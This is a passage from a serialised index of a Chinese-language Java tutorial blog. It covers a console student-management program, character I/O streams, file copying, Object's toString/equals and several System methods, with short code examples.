System.out.println(\"请输入要修改的学号：\"); String id = sc.nextLine(); //定义索引值，判断是否存在 int index = -1; for(int x = 0; x\u003carray.size(); x++) { Student s = array.get(x); if(s.getId().equals(id)) { index = x; break; } } if(index == -1) System.out.println(\"您输入的学号不存在，请重新输入：\"); else { System.out.println(\"请输入新的学生姓名：\"); String name = sc.nextLine(); System.out.println(\"请输入新的学生年龄：\"); String age = sc.nextLine(); System.out.println(\"请输入新的学生地址：\"); String address = sc.nextLine(); //创建学生对象 Student s = new Student(); s.setId(id); s.setName(name); s.setAge(age); s.setAddress(address); //修改集合中的对象 array.set(index, s); System.out.println(\"修改学生成功\"); } } // 删除学生 public static void deleteStudent(ArrayList\u003cStudent\u003e array) { //创建键盘录入对象 Scanner sc = new Scanner(System.in); System.out.println(\"请输入要删除对象的学号：\"); String id = sc.nextLine(); //遍历并对比 int index = -1; for(int x=0; x\u003carray.size(); x++) { Student s = array.get(x); if(s.getId().equals(id)) { index = x; break; } } if(index == -1) { System.out.println(\"您输入的学号不存在，请重新输入：\"); }else { array.remove(index); System.out.println(\"删除学生成功\"); } } // 添加学生 public static void addStudent(ArrayList\u003cStudent\u003e array) { // 创建键盘录入对象 Scanner sc = new Scanner(System.in); String id; // 加入ID是否重复的判断 while (true) { System.out.println(\"请输入学号：\"); id = sc.nextLine(); Boolean flag = false; for (int x = 0; x \u003c array.size(); x++) { Student s = array.get(x); if (s.getId().equals(id)) { flag = true; break; } } if (flag) { System.out.println(\"您输入的学号已被占用，请重新输入：\"); } else break; } System.out.println(\"请输入姓名：\"); String name = sc.nextLine(); System.out.println(\"请输入年龄：\"); String age = sc.nextLine(); System.out.println(\"请输入地址：\"); String address = sc.nextLine(); // 创建学生对象 Student s = new Student(); s.setId(id); s.setName(name); s.setAge(age); s.setAddress(address); // 把学生对象作为元素添加到集合中 array.add(s); // 给出提示： System.out.println(\"添加学生对象成功\"); } // 查看所有学生的方法 public static void findAllStudents(ArrayList\u003cStudent\u003e array) { // 首先判断集合中是否有数据，如果没有，就给出提示，并让该方法不继续执行下去 if (array.size() == 0) { System.out.println(\"不好意思，目前没有学生信息可供查询，请重新选择您的操作\"); return; } // \\t tab键制表符的位置 System.out.println(\"学号\\t\\t姓名\\t年龄\\t居住地\\t\"); for (int x = 0; x \u003c array.size(); x++) { Student s = array.get(x); System.out.println(s.getId() + \"\\t\" + s.getName() + \"\\t\" + s.getAge() + \"\\t\" + s.getAddress()); } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:7:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:7:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"IO流 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"IO流概述和分类 引入：类似ArrayList的集合类，存储数据的有效范围仅为该代码运行期间，在内存中临时存储，再次打开时输入的数据已丢失。而IO流技术可以永久存储。 概述：IO流用来处理设备之间的传输问题，包括文件复制、上传/下载文件等。 IO流分类： 输出流 (写数据)：FileWriter 输入流 (读数据)：FileReader 图示： ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"FileWriter概述 输出流写数据，通过阅读API学习 java.io包下：因此需要导包 import java.io.FileWriter; 输出流写数据的步骤： 创建输出流对象；\u003c创建文件时需要调用系统资源\u003e 调用输出流对象的写数据的方法，并flush刷新缓冲区； 释放资源。\u003c即通知系统释放和该文件相关的资源，因为创建输出流对象是调用系统资源创建的\u003e ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"FileWriter的构造方法和成员方法 构造方法： FileWriter(String fileName): 传递一个文件名称 \u003c或路径+文件名\u003e 成员方法： void write(String str): 写入数据 void flush(): 刷新缓冲区 数据不会直接写到文件，而是写到了内存缓冲区，flush刷新后显示 void close(): 释放调用的系统资源 创建输出流对象做了哪些事情：FileWriter fw = new FileWriter(\"d:\\\\a.txt\") 调用系统资源创建了一个文件；(没有路径所指文件时会自动创建) 创建输出流对象； 把输出流对象指向该文件。 写数据方法的路径问题： 相对路径：相对当前项目而言，在项目的根目录下(注意是\"项目”) 示例：FileWriter fw = new FileWriter(\"a.txt\")//不加盘符的文件名; eclipse中显示相对路径的文件： 选中项目project – 右键 – refresh，即可在项目下出现相应的文件(a.txt) 绝对路径：指明盘符的具体路径 示例：FileWriter fw = new FileWriter(\"d:\\\\a.txt\");//加了盘符位置的文件名 注意：mac中路径为’/users/xx/…’ close()和flush()方法： flush(): 刷新缓冲区；之后流对象还可以继续使用。 close(): 先刷新缓冲区，后通知系统释放资源；之后流对象不可以再使用了。 close()做两步，因此即使write()之后没有flush(), close()的时候也会自动刷新。 写入内容较少时，可以省略flush(). 代码示例：(注意导包和导抛出异常) import java.io.FileWriter; import java.io.IOException; public class FileWriterDemo{ public static void main(String[] args) throws IOException { //创建输出流对象 FileWriter fw = new FileWriter(\"d:\\\\a.txt\");//没有该文件时会自动创建，使用绝对路径 //如果不带盘符地址，默认为所写入的文件在代码项目所在路径下的相对路径 //调用数据流对象的写数据方法 fw.write(\"IO流你好\");//写一个字符串数据 fw.flush();//数据没有直接写到文件，而是写到了内存缓冲区，刷新缓冲区后才会显示 fw.write(\"javaee\"); fw.flush(); fw.close();//释放资源，否则fw会一直占用中 //fw.write(\"123\"); //close()之后再写数据会报错 } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"FileWriter写数据的方法 void write(String str): 写入一个字符串数据 代码示例：fw.write(\"abcde\"); fw.close(); //写入\"abcde\"; 此处写入较少可省略flush() void write(String str, int index, int lens): 写入一个字符串中的一部分数据，即从索引值index开始，长度为lens的子串 代码示例：fw.write(\"abcde\", 1, 3); fw.close(); //可写入\"bcd\" void write(int ch): 写入一个字符数据 为int类型的好处是：既可以写char类型的数据，也可以写char对应的int类型的值，比如’a’和97均可 代码示例：fw.write('a');和fw.write(97);均可写入字符’a’ void write(char[] chs): 写入一个字符数组数据 代码示例：char[] chs = {'a','b','c','d','e'}; fw.write(chs);//写入的数据在文件中的形式是\"abcde\"不带引号 void write(char[] chs, int index, int lens): 写入一个字符数组的一部分数据 代码示例：char[] chs = {'a','b','c','d','e'}; fw.write(chs,2,3);//写入的数据在文件中的形式是\"cde\"不带引号 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"FileWriter写数据的换行 用换行符可以实现换行 代码示例：for循环中：fw.write(x); fw.write(\"\\r\\n\"); 不同系统识别的换行符不同： Windows: \\r\\n linux: \\n mac: \\r 注意：如果在Windows用\\n写入，则自带的记事本打开无法识别，显得的仍然是没有换行的；而用编辑器打开可以识别。 缓冲流有特殊的换行方法 BufferedWriter: void newLine() – 可根据系统自动匹配换行符，详见缓冲流的特殊功能部分。 代码示例：bw.newLine();//取代bw.write(\"\\r\\n\")； ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"FileWriter写数据的追加写入 构造方法：FileWriter(Sting str, Boolean append) append默认为false，当需要追加时，可以在第二个参数位置写true 这时再运行，会将新的内容追加到文件中 代码示例： FileWriter fw = new FileWriter(\"c.txt\",true); //默认为false，写为true时表示追加写入 fw.write(\"xxxxxx\");//这时会追加新的xxxx内容写入到文件 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:6","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"FileReader概述 输入流写数据，通过阅读API学习 java.io包下：因此需要导包 import java.io.FileReader; 构造方法：FileReader(String filename) – 传递文件名称 注意：仍然需要导包和抛出异常 输入流写数据的步骤： 创建输入流对象; 调用输入流对象的读数据方法; 释放资源. ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:7","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"FileReader读数据的方法： int read(): 一次读取一个字符，且存储类型为int，即字符对应的int值 可通过(char)强转为char类型 再次使用本方法时：自动读取下一个字符 \u003c不需要像写数据一样声明追加\u003e 当没有可读取数据时，返回-1 \u003c可作为读取循环结束的判断条件\u003e 空格、回车等也可以读取到，不需要在输出语句(syso)里加ln 例如：读取某个.java文件，可以在控制台输出带格式的代码 循环时while语句的妙用： while((ch = fr.read()) != -1){...} 做了三步：read()读数据; 读取到的结果赋值给ch; 判断ch的值是否为-1 void close(): 读取结束后记得关闭释放资源 代码示例：fr.close(); 读数据常见异常： java.io.FileNotFoundException: fr.txt (系统找不到指定文件) 代码示例： import java.io.fileNotFoundException; import java.io.FileReader; import java.io.IOException; public class FileReaderDemo{ public static void main(String[] args) throws IOException{ FileReader fr = new FileReader(\"fr.txt\");//创建输入流对象; fr.txt内容为：\"abc\" /* int ch = fr.read();//调用输入流对象的读取方法 System.out.println(ch);//97 System.out.println((char)ch);//a */ int ch; while((ch = fr.read()) != -1){//这条语句做了三个步骤 System.out.print(); } fr.close();//释放资源 } } int read(char[] cbuf) 一次读取一个字符数组的数据，返回\u003c实际\u003e读取的字符个数 步骤仍然是：创建对象；调用读数据方法；释放资源。 char[] chs = new char[1024]; 自定义字符数组，相当于读取到自定义数组中，数组长度为每次读取的字符个数 通常，数组长度定义为1024或1024的整数倍：因为MB,GB等的换算是1024 读取为空时，返回-1 \u003c可作为循环结束的条件\u003e 会读取回车 \\r\\n，占用2个长度 上一次的读取会被下一次替换，当下一次读取不够全部替换上一次读取时，上一次的读取会遗留在存储字符数组中 详见下方图解 输入推荐用System.out.println(new String(chs,0,len)); 代码示例： //创建输入流对象 FileReader fr = new FileReader(\"a.txt\"); char[] chs = new char[1024]; int len; while((len = fr.read(chs)) != -1){ System.out.print(new String(chs,0,len));//注意syso不要写ln，读取了回车等格式符 } fr.close(); FileReader两种读数据方法对比图解 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:8","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"IO流案例：复制文本文件 题目： 文件复制：将相同项目下的a.java中的内容复制到b.java文件中 文件复制的套路： 数据源：a.java – 读数据 – FileReader 目的地：b.java – 写数据 – FileWriter 注意点： 同时有读写时，close()先关哪个都可，推荐先关write. ‘一次读取一个字符’的代码示例： FileReader fr = new FileReader(\"a.java\");//同项目下，用相对路径即可。下同。 FileWriter fw = new FileWriter(\"b.java\"); //一次读取一个字符的定义方法 int ch;//定义返回值flag while((ch = fr.read()) != -1){//参考按单个字符读取的循环 fw.write(ch); } fw.close(); fr.close(); ‘一次读取一个字符数组’的代码示例： FileReader fr = new FileReader(\"a.java\");//同项目下，用相对路径即可。下同。 FileWriter fw = new FileWriter(\"b.java\"); //一次读取一个字符数组的定义方法 char[] chs = new char[1024];//定义读取的字符数组 int len;//定义返回值flag while((len = fr.read(chs)) != -1){//参考按单个字符读取的循环 fw.write(chs,0,len); } fw.close(); fr.close(); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:9","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"字符缓冲流 BufferedWriter: 将文本写入字符输出流，缓冲各个字符，从而提供单个字符、数组、字符串的高效写入 代码示例：BufferedWriter bw = new BufferedWriter(new FileWriter(\"bw.txt\")); 调用使用同FileWriter() BufferedReader: 从字符输入流中读取文本，缓冲各个字符，从而提供单个字符、数组、行的高效读取 代码示例：BufferedReader br = new BufferedReader(new FileReader(\"br.txt\")); 仍然分为读取单个字符和读取字符数组两种方式。 导包：import java.io.BufferedWriter/BufferedReader; 用缓冲流复制文件 注意：记得开始导包和抛出异常 数据源：a.java – 读数据 – FileReader – 高效读数据 – BufferedReader 目的地：b.java – 写数据 – FileWriter – 高效写数据 – BufferedWriter 代码示例： import java.io.* ... public static void main(String[] args) throws IOException{ BufferedReader br = new BufferedReader(new FileReader(\"a.java\")); BufferedWriter bw = new BufferedWriter(new FileWriter(\"b.java\")); /* //一次读写一个字符 int ch; while((ch = br.read()) != -1){ bw.write((char)ch); } */ //一次读取一个字符数组 char[] chs = new char[1024]; int len; while((len = br.read(chs)) != -1){ bw.write(chs,0,len);//不要忘记参数，防止写入未覆盖的遗留数据 } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:10","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"字符缓冲流的特殊功能 字符缓冲流： 包含缓冲输入/输出流：BufferedWriter 和 BufferedReader 创建缓冲流对象：构造方法参数为对应的基本输入/输出流对象，而不是直接传入文件。 代码示例：BufferedReader br = new BufferedReader(new FileReader(\"br.txt\")); BufferedWriter: void newLine(): 写一个换行符，这个换行符由系统决定 不需要再判断系统换行符，取代之前的fw.write(\"\\r\\n\"); 代码示例: bw.newLine(); BufferedReader: String readLine(): 一次读取一行数据，但不读取换行符 (但读取空格) 返回值是字符串格式 读取空格：所以不用担心格式会乱，只需要加上换行即可 读取为空时返回null，可以作为循环结束的判断语句 代码示例： BufferedReader br = new BufferedReader(new FileReader(\"br.txt\")); String line; while((line = br.readLine()) != null){//这里同时做了三步，同上 (读取、赋值、判断) System.out.println();//readLine()不读取换行符，因此syso语句需要加上`ln` } br.close(); 导包注意点： 用字符缓冲流时，BufferedWriter/BufferedReader和FileWriter/FileReader都需要导入 当然还有IO流异常 IOException 使用字符缓冲流的特殊方法复制文本文件 代码示例： public class CopyFileDemo{ public static void main(String[] args) throws IOException{ //创建缓冲流对象 BufferedReader br = new BufferedReader(new FileReader(\"a.txt\")); BufferedWriter bw = new BufferedWriter(new FileWriter(\"b.txt\")); String line; while((line = br.readLine()) != null){ bw.write(line); bw.newLine() bw.flush(); } bw.close(); br.close() } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:11","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"复制文本文件的5种方法 基本流一次读写一个字符 基本流一次读写一个字符数组 缓冲流一次读写一个字符 注意：缓冲流也可以用基本流的方法br.read()进行读取 缓冲流一次读写一个字符数组 缓冲流一次读写一个字符串 \u003c推荐，重点掌握\u003e 用缓冲流的特殊方法进行读写 br.readLine() and bw.newLine(). 注： 写代码时可以将读写的文件名和五种方法单独定义，提高复用性 此处涉及异常抛出注意点：当所调用的方法抛出了异常时，所调用的方法也需要抛出异常，即main方法也需要加throws IOException ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:12","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"集合数据的读取 IO流：将集合中的数据写入文本文件 题目： 把ArrayList集合中的字符串数据存储到文本文件，每一个字符串元素作为文件中的一行数据 步骤： 创建集合对象 往集合中添加元素 创建输出缓冲流对象 遍历集合，得到每一个字符串元素，然后把该字符串元素作为数据写入到文本文件 释放资源 代码示例： import java.io.*; //(ctrl+shift+o大法好) import java.util.ArrayList; public class ArrayListToFile{ public static void main(String[] args) throws IOException{ ArrayList\u003cString\u003e array = new ArrayList\u003c\u003e(); array.add(\"hello\"); array.add(\"Java\"); array.add(\"world\"); BufferedWriter bw = new BufferedWriter(new FileWriter(\"a.txt\")); for(int i=0;i\u003carray.size();i++){ String s = array.get(i); bw.write(s); bw.newLine(); bw.flush(); } bw.close(); } } //运行，并刷新项目 IO流：将文本文件中的数据读取并存入集合中 题目： 文本文件中读取数据到ArrayList中，并遍历集合；每一行数据作为一个字符串元素。 步骤： 创建输入缓冲流对象； 创建集合对象； 去读数据，每次读取一行数据，把该行数据作为一个元素存储到集合中； 释放资源； 遍历集合. 代码示例： import java.io.*; //(ctrl+shift+o大法好) import java.util.ArrayList; public class ArrayListToFile{ public static void main(String[] args) throws IOException{ BufferedReader br = new BufferedReader(new FileReader(\"a.txt\")); ArrayList\u003cString\u003e array = new ArrayList\u003c\u003e(); String line; while((line = br.readLine()) != null){ array.add(line); } br.close(); for(int i=0;i\u003carray.size();i++){ String s = array.get(i); System.out.println(s); } } } //运行，并刷新项目 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:13","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:8:14","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"IO流版学生管理系统 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:9:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"图示： 左右为核心部分，中间加入集合作为临时存储，避免频繁读写文件； 左-中：为之前的集合版学生管理系统，代码可以复用 中-右：为集合与文件的读写，加入两个读写方法 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:9:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"学生类代码 可直接复用 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:9:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"学生管理类代码 复用增删改查方法，并加入集合到文件的读写两个方法 增删改查： main方法中删去新建ArrayList, 改为定义文件 String fileName = \"students.txt\"; 参数列表改为传入文件名： public static void addStudent(String fileName){} 增删改查方法中先新建ArrayList，后读取文件到集合对象中，下面就一样了 ArrayList\u003cStudent\u003e array = new ArrayList\u003c\u003e(); readData(fileName,array); 增删改查方法的最后，array操作之后，将集合对象中的数据写入文件： writeData(fileName,array); 注意：增删改查和main方法需要跟着抛出异常。 代码示例： //main方法和增删改查略 //从文件中读取数据到集合: 'heima001,向问天,30,北京'作为一条对应一个Student对象 public static void readData(String fileName, ArrayList\u003cStudent\u003e array) throws IOException{ //创建输入缓冲流对象 BufferedReader br = new BufferedReader(new FileReader(\"fileName\")); String line; while((line = br.readLine()) != null){ String[] datas = line.spit(\",\"); Student s = new Student(); s.setId(datas[0]); s.setName(datas[1]); s.setAge(datas[2]); s.setAddress(datas[3]); array.add(s); } br.close(); } //把集合中的数据写入文件：'heima001,向问天,30,北京'作为一条对应一个Student对象 public static void writerData() throws IOException{ //创建输出缓冲流对象 BufferedWriter bw = new BufferedWriter(new FileWriter(fileName)); for(int i = 0; i\u003carray.size(); i++){ Student s = array.get(i); StringBuilder sb = new StringBuilder();//需要拼接成’heima001,向问天,30,北京‘，可以用StringBuilder sb.append(s.getId()).append(\",\").append(s.getName()).append(\",\").append(s.getAge()).append(\",\").append(s.getAddress(); bw.write(sb.toString()); bw.newLine(); bw.flush(); } bw.close(); } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:9:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:9:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Object ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:10:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"对象 可以通过查阅API进行学习 eclipse： ctrl/command + 光标移动到某某XX：打开并查看源码 ctrl/command + o: 展示代码结构(类、变量、方法等)，搜索输入可以查找 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:10:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"概述 Object类 是类层次结构的根类, 在java.lang包下。 每个类都使用 Object 作为超类。 所有对象（包括数组）都实现这个类的方法 代码示例： class Demo extends Object{...}//默认继承Object类 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:10:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Object类要掌握的功能 toString equals ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:10:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"toString方法 eclipse：ctrl/command+XX：查看源码 command+toString跳转到其源码 String toString: 返回对象的字符串表示 输出对比可知：输出对象，默认输出的是对象.toString() toString源码：return getClass().getName() + \"@\" + Integer.toHexString(hashCode()); getClass()：返回运行时类，即字节码文件 getName()：返回类名 “@\"：一个分隔符 Integer.toHexString()：返回指定参数的十六进制字符串形式 hashCode()：返回该对象的哈希码值(内存地址) 注意： toString的源码对于输出没有意义，一般重写toString方法 eclipse提供了快捷重写：source – Generate toString – 选择变量 – 自动生成重写的toString方法 toString方法的使用场景： 一般开发不用，自己写/学习/测试/调试的时候多用 代码示例： Fruit f = new Fruit(); System.out.println(f.toString());//test.demo.Fruit@6ff3c5b5 System.out.println(f);//test.demo.Fruit@6ff3c5b5 -- 输出对比 public class ObjectDemo { public static void main(String[] args) { Fruit f = new Fruit(); System.out.println(f.toString());//test.demo.Fruit@6ff3c5b5 f.name = \"橘子\"; f.age = 12; System.out.println(f);//test.demo.Fruit@6ff3c5b5 } } class Fruit extends Object{ String name; int age; @Override public String toString() { return \"Fruit [name=\" + name + \", age=\" + age + \"]\"; } } /* 输出： Fruit [name=null, age=0] Fruit [name=橘子, age=12] */ ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:10:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"equals方法 boolean equals(Object 0): 使用==来比较两个对象是否相等，比较的是地址值是否相等 比较地址值没有什么意义，如果要使用，一般需要重写equals方法 源码： public boolean equals(Object obj) { return (this == obj); } eclipse提供了快捷重写： source – Generate HashCode() and equals() – 选择变量 – 自动生成重写的两个方法 自动生成的代码： @Override public boolean equals(Object obj) { if (this == obj) //判断是否是本身：提高效率 return true; if (obj == null) //判断是否为空：方法可以调用，那么this本身一定不是null，提高效率 return false; if (getClass() != obj.getClass()) //判断类型是否不同，不同则一定不相等：提高健壮性，避免下一行向下转型抛出异常 return false; Fruit other = (Fruit) obj; //向下转型 if (age != other.age) return false; if (name == null) { if (other.name != null) //一个为null，一个不为null return false; } else if (!name.equals(other.name)) //基本判断 return false; return true;//以上情况都没有时，返回true } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:10:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:10:6","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"System ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:11:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"eclipse快捷键 方法抽取： 将方法抽取为一个独立的方法 方法抽取快捷键： 右键 – refactor – extract method(这里会展示快捷键组合提示) windows: alt+shift+M Mac: option+command+M 抽取步骤： 选中想要抽取的代码 抽取操作(以上三种任选其一) 抽取为独立方法 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:11:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"System类概述 概述： System：包含一些有用的类字段和方法；不能被实例化。 类字段：静态所修饰的成员变量，属于所有的对象，因此称为类字段。 不能实例化：构造方法是私有的； 不能实例化的类：抽象类；构造私有的工具类。 成员变量和成员方法静态修饰：static，直接用类名调用。 System类提供的设施中有： 标准输入、标准输出和错误输出流； 对外部定义的属性和环境变量的访问； 加载文件和库的方法； 快速复制数组的一部分的实用方法。 System类要掌握的功能 arraycopy exit currentTimeMillis ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:11:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"arraycopy static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length) 从指定源数组中复制一个数组，复制从指定的位置开始，到目标数组的指定位置结束。 Object src: 源数组 int srcPos: 源数组的起始索引位置 Object dest: 目标数组 int destPos: 目标数组的位置 int length: 指定接收的元素个数 使用注意： 长度length：注意在源数组和目标数组都会存在越界问题 目标数组中，没有存放源数组复制到的新元素的位置，还是默认值 比如int[]中，仍是默认值0 length灵活，不一定要复制完源数组中从索引值开始以后的所有元素，可以只复制部分 代码示例： private static void method() { int[] src = {1,2,3,4,5}; int[] dest = new int[5]; // System.arraycopy(src, 0, dest, 0, 5);//12345 // System.arraycopy(src, 2, dest, 0, 3);//34500 // System.arraycopy(src, 2, dest, 2, 5);//Exception in thread \"main\" java.lang.ArrayIndexOutOfBoundsException // System.arraycopy(src, 2, dest, 2, 3);//00345 // System.arraycopy(src, 2, dest, 2, 1);//00300 System.arraycopy(src, 2, dest, 4, 3);//Exception in thread \"main\" java.lang.ArrayIndexOutOfBoundsException for(int i=0; i\u003cdest.length;i++) { System.out.print(dest[i]); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:11:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"currentTimeMillis static long currentTimeMillis() 返回以毫秒为单位的当前时间。 1000 毫秒 = 1秒 返回的是相对时间 即：当前时间与协调世界时 1970 年 1 月 1 日午夜之间的时间差（以毫秒为单位测量） 示例： 1970-1-1 00:00:00：返回0 1970-1-1 00:00:01：返回1000 1970-1-1 00:01:00：返回1000 * 60 1970-1-1 01:00:00：返回1000 * 60 * 60 注意: 当返回值的时间单位是毫秒时，值的粒度取决于底层操作系统，并且粒度可能更大。例如，许多操作系统以几十毫秒为单位测量时间。 应用场景： 可以在开始和结束分别求时间点，并相减得出程序的运行时间(单位：毫秒) 代码示例： long start = System.currentTimeMillis(); for (int i = 0; i \u003c 1000000; i++) { System.out.println(i); } long end = System.currentTimeMillis(); System.out.println(end-start); /* 输出： ... 999998 999999 1845 */ ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:11:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"exit static void exit(int status) 终止当前正在运行的 Java 虚拟机 参数用作状态码；根据惯例，非 0 的状态码表示异常终止。 终止代码：System.exit(0); 代码示例： for (int i = 0; i \u003c 1000; i++) { System.out.println(i); if(i==100) System.exit(0);//当i==100时，终止虚拟机 } /* 输出： ... 97 98 99 100 */ ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:11:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"gc static void gc(): 运行垃圾回收器 调用 gc 方法暗示着 Java 虚拟机做了一些努力来回收未用对象，以便能够快速地重用这些对象当前占用的内存。 当控制权从方法调用中返回时，虚拟机已经尽最大努力从所有丢弃的对象中回收了空间。 “尽最大努力”：意味着不一定会全部回收。 系统会自动调用。 